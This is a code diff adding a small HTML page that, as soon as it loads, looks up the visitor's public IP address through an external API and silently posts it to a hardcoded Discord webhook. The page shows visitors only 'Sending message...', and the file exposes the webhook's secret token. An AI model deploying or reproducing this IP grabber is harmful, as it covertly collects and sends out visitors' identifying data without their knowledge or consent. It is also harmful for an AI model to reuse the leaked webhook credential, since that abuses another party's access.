@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Webhook with IP</title>
+</head>
+<body>
+
+<h2>Sending message...</h2>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1475949712338194534/K6j2hHB8YfpHW9TG6KW0ZNMAAUrX41bQnCWMF-JhU9kZRBAjo-fi5u6SPjhzwKWhrIH2";
+
+async function sendWebhook() {
+  try {
+    // Get visitor IP using external API
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipResponse.json();
+    const userIp = ipData.ip;
+
+    // Send webhook with IP
+    const response = await fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `IP: ${userIp}`
+      })
+    });
+
+    console.log("Status:", response.status);
+
+    if (!response.ok) {
+      console.error("Failed:", response.status);
+    }
+  } catch (err) {
+    console.error("Error:", err);
+  }
+}
+
+// Automatically run when page loads
+window.onload = sendWebhook;
+</script>
+
+</body>
+</html>
